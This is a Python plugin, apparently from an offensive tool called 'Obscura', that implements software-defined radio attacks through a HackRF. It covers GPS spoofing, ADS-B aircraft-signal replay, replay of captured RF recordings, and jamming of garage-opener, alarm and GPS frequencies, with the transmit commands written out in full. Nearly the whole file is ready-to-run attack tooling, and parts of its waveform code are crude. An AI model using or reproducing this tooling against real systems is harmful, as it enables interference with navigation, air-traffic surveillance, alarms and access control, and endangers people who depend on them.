"""
SDR Attack Plugin for Obscura
Implements professional-grade Software-Defined Radio exploitation techniques including:
- GPS spoofing via gps-sdr-sim
- ADS-B replay via dump1090 + HackRF
- RF replay from .iq files (GNURadio)
- Jamming modules for 315MHz (garage openers), 433MHz (alarm systems), GPS L1
- Waveform generation via GNURadio
"""

import os
import sys
import subprocess
import time
import struct
import random
import threading
from typing import List, Dict, Any, Optional, Tuple
from pathlib import Path
import tempfile
import shutil

try:
    from ..hardware import get_hardware_profile, get_preferred_sdr, find_iq_fixtures
except ImportError:
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
    from hardware import get_hardware_profile, get_preferred_sdr, find_iq_fixtures

SUPPORTED_SDRS = ['hackrf', 'rtlsdr', 'usrp', 'limesdr', 'bladerf']

GPS_L1_FREQ = 1575420000
ADSB_FREQ = 1090000000
GARAGE_315MHZ = 315000000
ALARM_433MHZ = 433000000

DEFAULT_SAMPLE_RATE = 2600000
GPS_SAMPLE_RATE = 2600000
ADSB_SAMPLE_RATE = 2000000


def check_tool_availability(tool_name: str) -> bool:
    """Check if a command-line tool is available."""
    try:
        result = subprocess.run(['which', tool_name], 
                              capture_output=True, 
                              text=True,
                              timeout=5)
        return result.returncode == 0
    except Exception:
        return False


def detect_sdr_hardware() -> Dict[str, bool]:
    """
    Detect available SDR hardware using hardware abstraction layer.
    
    Returns:
        Dict mapping SDR type to availability
    """
    try:
        profile = get_hardware_profile()
        hardware = {
            'hackrf': False,
            'rtlsdr': False,
            'usrp': False,
            'limesdr': False,
            'bladerf': False
        }
        
        for device in profile.sdr_devices:
            if device.device_type in hardware:
                hardware[device.device_type] = True
        
        return hardware
    except Exception:
        hardware = {
            'hackrf': False,
            'rtlsdr': False,
            'usrp': False,
            'limesdr': False,
            'bladerf': False
        }
        
        if check_tool_availability('hackrf_info'):
            try:
                result = subprocess.run(['hackrf_info'], 
                                      capture_output=True, 
                                      text=True,
                                      timeout=5)
                if 'Serial number' in result.stdout:
                    hardware['hackrf'] = True
            except Exception:
                pass
        
        if check_tool_availability('rtl_test'):
            try:
                result = subprocess.run(['rtl_test', '-t'], 
                                      capture_output=True, 
                                      text=True,
                                      timeout=3)
                if 'Found' in result.stdout:
                    hardware['rtlsdr'] = True
            except Exception:
                pass
        
        if check_tool_availability('uhd_find_devices'):
            try:
                result = subprocess.run(['uhd_find_devices'], 
                                      capture_output=True, 
                                      text=True,
                                      timeout=5)
                if 'USRP' in result.stdout:
                    hardware['usrp'] = True
            except Exception:
                pass
        
        if check_tool_availability('LimeUtil'):
            try:
                result = subprocess.run(['LimeUtil', '--find'], 
                                      capture_output=True, 
                                      text=True,
                                      timeout=5)
                if 'LimeSDR' in result.stdout:
                    hardware['limesdr'] = True
            except Exception:
                pass
        
        if check_tool_availability('bladeRF-cli'):
            try:
                result = subprocess.run(['bladeRF-cli', '-p'], 
                                      capture_output=True, 
                                      text=True,
                                      timeout=5)
                if result.returncode == 0:
                    hardware['bladerf'] = True
            except Exception:
                pass
        
        return hardware


def generate_gps_trajectory(lat: float, lon: float, alt: float, duration: int = 300) -> str:
    """
    Generate a simple GPS trajectory CSV file.
    
    Args:
        lat: Latitude in degrees
        lon: Longitude in degrees
        alt: Altitude in meters
        duration: Duration in seconds
    
    Returns:
        Path to generated CSV file
    """
    tmpfile = tempfile.NamedTemporaryFile(mode='w', suffix='.csv', delete=False)
    
    for i in range(0, duration, 10):
        lat_offset = (random.random() - 0.5) * 0.001
        lon_offset = (random.random() - 0.5) * 0.001
        alt_offset = (random.random() - 0.5) * 10
        
        tmpfile.write(f"{lat + lat_offset},{lon + lon_offset},{alt + alt_offset},{i}\n")
    
    tmpfile.close()
    return tmpfile.name


def gps_spoof_via_sdr_sim(
    self,
    latitude: float = 37.7749,
    longitude: float = -122.4194,
    altitude: float = 100.0,
    duration: int = 300,
    output_file: Optional[str] = None,
    transmit: bool = False
) -> bool:
    """
    Perform GPS spoofing using gps-sdr-sim.
    
    Args:
        latitude: Target latitude in degrees
        longitude: Target longitude in degrees
        altitude: Target altitude in meters
        duration: Duration of simulation in seconds
        output_file: Output .bin file path (auto-generated if None)
        transmit: Whether to transmit via HackRF (requires hardware)
    
    Returns:
        bool: True if GPS signal generated/transmitted successfully
    """
    simulate = getattr(self, 'simulate_mode', False)
    
    if simulate:
        log_msg = (f"[DRY RUN] GPS Spoofing: Lat={latitude}, Lon={longitude}, "
                  f"Alt={altitude}m, Duration={duration}s, Transmit={transmit}")
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        return True
    
    if not check_tool_availability('gps-sdr-sim'):
        error_msg = "[GPS Spoof] gps-sdr-sim not found. Install from github.com/osqzss/gps-sdr-sim"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False
    
    try:
        trajectory_file = generate_gps_trajectory(latitude, longitude, altitude, duration)
        
        if output_file is None:
            output_file = tempfile.NamedTemporaryFile(suffix='.bin', delete=False).name
        
        log_msg = f"[GPS Spoof] Generating GPS signal: {latitude},{longitude} @ {altitude}m"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        cmd = ['gps-sdr-sim', '-l', f"{latitude},{longitude},{altitude}", '-o', output_file]
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=60
        )
        
        if result.returncode != 0:
            error_msg = f"[GPS Spoof] gps-sdr-sim failed: {result.stderr}"
            if hasattr(self, 'attack_log'):
                self.attack_log.append(error_msg)
            print(error_msg)
            return False
        
        success_msg = f"[GPS Spoof] Generated GPS signal file: {output_file}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        if transmit:
            hardware = detect_sdr_hardware()
            if hardware['hackrf']:
                return _transmit_gps_hackrf(self, output_file)
            else:
                warn_msg = "[GPS Spoof] No HackRF detected, transmission skipped"
                if hasattr(self, 'attack_log'):
                    self.attack_log.append(warn_msg)
                print(warn_msg)
        
        if hasattr(self, 'generated_files'):
            self.generated_files.append(output_file)
        
        return True
        
    except Exception as e:
        error_msg = f"[GPS Spoof] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def _transmit_gps_hackrf(self, gps_bin_file: str) -> bool:
    """Transmit GPS signal via HackRF."""
    if not check_tool_availability('hackrf_transfer'):
        error_msg = "[GPS Transmit] hackrf_transfer not found"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False
    
    try:
        log_msg = "[GPS Transmit] Transmitting GPS signal on L1 (1575.42 MHz)"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        cmd = [
            'hackrf_transfer',
            '-t', gps_bin_file,
            '-f', str(GPS_L1_FREQ),
            '-s', str(GPS_SAMPLE_RATE),
            '-a', '1',
            '-x', '20'
        ]
        
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        if hasattr(self, 'active_attacks'):
            self.active_attacks.append(proc)
        
        time.sleep(30)
        
        success_msg = "[GPS Transmit] GPS spoofing signal transmitted"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[GPS Transmit] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def adsb_replay_attack(
    self,
    adsb_capture_file: Optional[str] = None,
    duration: int = 60,
    transmit: bool = False
) -> bool:
    """
    Perform ADS-B replay attack using dump1090 + HackRF.
    
    Args:
        adsb_capture_file: Path to captured ADS-B .bin file (generates sample if None)
        duration: Duration to transmit in seconds
        transmit: Whether to transmit via HackRF
    
    Returns:
        bool: True if ADS-B replay executed successfully
    """
    simulate = getattr(self, 'simulate_mode', False)
    
    if simulate:
        log_msg = (f"[DRY RUN] ADS-B Replay: File={adsb_capture_file or 'sample'}, "
                  f"Duration={duration}s, Transmit={transmit}")
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        return True
    
    try:
        if adsb_capture_file is None:
            log_msg = "[ADS-B Replay] No capture file provided, generating sample data"
            if hasattr(self, 'attack_log'):
                self.attack_log.append(log_msg)
            print(log_msg)
            
            adsb_capture_file = tempfile.NamedTemporaryFile(suffix='.bin', delete=False).name
            with open(adsb_capture_file, 'wb') as f:
                for _ in range(1000):
                    sample = struct.pack('<hh', 
                                       random.randint(-32768, 32767),
                                       random.randint(-32768, 32767))
                    f.write(sample)
        
        if not os.path.exists(adsb_capture_file):
            error_msg = f"[ADS-B Replay] Capture file not found: {adsb_capture_file}"
            if hasattr(self, 'attack_log'):
                self.attack_log.append(error_msg)
            print(error_msg)
            return False
        
        log_msg = f"[ADS-B Replay] Replaying ADS-B data from {adsb_capture_file}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        if transmit:
            hardware = detect_sdr_hardware()
            if hardware['hackrf']:
                return _transmit_adsb_hackrf(self, adsb_capture_file, duration)
            else:
                warn_msg = "[ADS-B Replay] No HackRF detected, transmission skipped"
                if hasattr(self, 'attack_log'):
                    self.attack_log.append(warn_msg)
                print(warn_msg)
        
        success_msg = "[ADS-B Replay] Replay prepared (use transmit=True to broadcast)"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[ADS-B Replay] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def _transmit_adsb_hackrf(self, adsb_file: str, duration: int) -> bool:
    """Transmit ADS-B replay via HackRF."""
    if not check_tool_availability('hackrf_transfer'):
        error_msg = "[ADS-B Transmit] hackrf_transfer not found"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False
    
    try:
        log_msg = "[ADS-B Transmit] Transmitting ADS-B on 1090 MHz"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        cmd = [
            'hackrf_transfer',
            '-t', adsb_file,
            '-f', str(ADSB_FREQ),
            '-s', str(ADSB_SAMPLE_RATE),
            '-a', '1',
            '-x', '10'
        ]
        
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        if hasattr(self, 'active_attacks'):
            self.active_attacks.append(proc)
        
        time.sleep(duration)
        proc.terminate()
        
        success_msg = "[ADS-B Transmit] ADS-B replay transmitted"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[ADS-B Transmit] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def rf_replay_from_iq(
    self,
    iq_file: str,
    center_freq: int,
    sample_rate: int = DEFAULT_SAMPLE_RATE,
    gain: int = 20,
    duration: int = 30,
    transmit: bool = False
) -> bool:
    """
    Replay RF signal from .iq file using HackRF.
    
    Args:
        iq_file: Path to .iq file (complex float or int16)
        center_freq: Center frequency in Hz
        sample_rate: Sample rate in Hz
        gain: TX gain in dB
        duration: Duration to transmit in seconds
        transmit: Whether to transmit via HackRF
    
    Returns:
        bool: True if RF replay executed successfully
    """
    simulate = getattr(self, 'simulate_mode', False)
    
    if simulate:
        log_msg = (f"[DRY RUN] RF Replay: File={iq_file}, Freq={center_freq}Hz, "
                  f"Rate={sample_rate}Hz, Gain={gain}dB, Duration={duration}s, Transmit={transmit}")
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        return True
    
    if not os.path.exists(iq_file):
        error_msg = f"[RF Replay] IQ file not found: {iq_file}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False
    
    try:
        log_msg = f"[RF Replay] Preparing replay: {iq_file} @ {center_freq / 1e6:.2f} MHz"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        if transmit:
            hardware = detect_sdr_hardware()
            if hardware['hackrf']:
                return _transmit_iq_hackrf(self, iq_file, center_freq, sample_rate, gain, duration)
            else:
                warn_msg = "[RF Replay] No HackRF detected, transmission skipped"
                if hasattr(self, 'attack_log'):
                    self.attack_log.append(warn_msg)
                print(warn_msg)
        
        success_msg = "[RF Replay] Replay prepared (use transmit=True to broadcast)"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[RF Replay] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def _transmit_iq_hackrf(self, iq_file: str, freq: int, rate: int, gain: int, duration: int) -> bool:
    """Transmit IQ file via HackRF."""
    if not check_tool_availability('hackrf_transfer'):
        error_msg = "[RF Transmit] hackrf_transfer not found"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False
    
    try:
        log_msg = f"[RF Transmit] Transmitting on {freq / 1e6:.2f} MHz"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        cmd = [
            'hackrf_transfer',
            '-t', iq_file,
            '-f', str(freq),
            '-s', str(rate),
            '-a', '1',
            '-x', str(gain)
        ]
        
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        if hasattr(self, 'active_attacks'):
            self.active_attacks.append(proc)
        
        time.sleep(duration)
        proc.terminate()
        
        success_msg = "[RF Transmit] RF replay transmitted"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[RF Transmit] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def rf_jamming_attack(
    self,
    target_freq: int,
    bandwidth: int = 1000000,
    duration: int = 30,
    jam_type: str = 'noise',
    transmit: bool = False
) -> bool:
    """
    Perform RF jamming attack on specified frequency.
    
    Args:
        target_freq: Target frequency in Hz (315MHz, 433MHz, or GPS L1)
        bandwidth: Jamming bandwidth in Hz
        duration: Duration to jam in seconds
        jam_type: Type of jamming ('noise', 'tone', 'sweep')
        transmit: Whether to transmit via HackRF
    
    Returns:
        bool: True if jamming attack executed successfully
    """
    simulate = getattr(self, 'simulate_mode', False)
    
    if simulate:
        log_msg = (f"[DRY RUN] RF Jamming: Freq={target_freq / 1e6:.2f}MHz, "
                  f"BW={bandwidth / 1e3:.1f}kHz, Type={jam_type}, Duration={duration}s, Transmit={transmit}")
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        return True
    
    try:
        log_msg = f"[RF Jamming] Preparing {jam_type} jamming @ {target_freq / 1e6:.2f} MHz"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        jam_file = _generate_jamming_waveform(jam_type, bandwidth, duration)
        
        if transmit:
            hardware = detect_sdr_hardware()
            if hardware['hackrf']:
                return _transmit_jamming_hackrf(self, jam_file, target_freq, DEFAULT_SAMPLE_RATE, duration)
            else:
                warn_msg = "[RF Jamming] No HackRF detected, transmission skipped"
                if hasattr(self, 'attack_log'):
                    self.attack_log.append(warn_msg)
                print(warn_msg)
        
        success_msg = "[RF Jamming] Jamming waveform prepared (use transmit=True to broadcast)"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[RF Jamming] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def _generate_jamming_waveform(jam_type: str, bandwidth: int, duration: int) -> str:
    """Generate jamming waveform based on type."""
    tmpfile = tempfile.NamedTemporaryFile(suffix='.bin', delete=False)
    
    samples = int(DEFAULT_SAMPLE_RATE * duration)
    
    if jam_type == 'noise':
        for _ in range(samples):
            i = struct.pack('<h', random.randint(-32768, 32767))
            q = struct.pack('<h', random.randint(-32768, 32767))
            tmpfile.write(i + q)
    
    elif jam_type == 'tone':
        amplitude = 30000
        for i in range(samples):
            phase = (i * 2 * 3.14159 * (bandwidth / 2) / DEFAULT_SAMPLE_RATE)
            i_sample = int(amplitude * (phase % 1.0))
            q_sample = int(amplitude * ((phase + 0.25) % 1.0))
            tmpfile.write(struct.pack('<hh', i_sample, q_sample))
    
    elif jam_type == 'sweep':
        amplitude = 30000
        for i in range(samples):
            freq = (i % 10000) * bandwidth / 10000
            phase = (i * 2 * 3.14159 * freq / DEFAULT_SAMPLE_RATE)
            i_sample = int(amplitude * (phase % 1.0))
            q_sample = int(amplitude * ((phase + 0.25) % 1.0))
            tmpfile.write(struct.pack('<hh', i_sample, q_sample))
    
    tmpfile.close()
    return tmpfile.name


def _transmit_jamming_hackrf(self, jam_file: str, freq: int, rate: int, duration: int) -> bool:
    """Transmit jamming signal via HackRF."""
    if not check_tool_availability('hackrf_transfer'):
        error_msg = "[Jamming Transmit] hackrf_transfer not found"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False
    
    try:
        log_msg = f"[Jamming Transmit] Transmitting jamming signal on {freq / 1e6:.2f} MHz"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(log_msg)
        print(log_msg)
        
        cmd = [
            'hackrf_transfer',
            '-t', jam_file,
            '-f', str(freq),
            '-s', str(rate),
            '-a', '1',
            '-x', '47'
        ]
        
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        if hasattr(self, 'active_attacks'):
            self.active_attacks.append(proc)
        
        time.sleep(duration)
        proc.terminate()
        
        success_msg = "[Jamming Transmit] Jamming signal transmitted"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(success_msg)
        print(success_msg)
        
        return True
        
    except Exception as e:
        error_msg = f"[Jamming Transmit] Error: {e}"
        if hasattr(self, 'attack_log'):
            self.attack_log.append(error_msg)
        print(error_msg)
        return False


def register_attack() -> Dict[str, Any]:
    """
    Register SDR attack module with Obscura orchestrator.
    
    Returns:
        Dict containing attack metadata and execution function
    """
    return {
        "name": "sdr_attacks",
        "description": "SDR-based attacks including GPS spoofing, ADS-B replay, RF replay, and jamming",
        "requires": ["sdr"],
        "platforms": ["linux"],
        "mitre_id": "T0884",
        "attacks": {
            "gps_spoof": gps_spoof_via_sdr_sim,
            "adsb_replay": adsb_replay_attack,
            "rf_replay": rf_replay_from_iq,
            "rf_jamming": rf_jamming_attack,
        },
        "hardware_detection": detect_sdr_hardware
    }
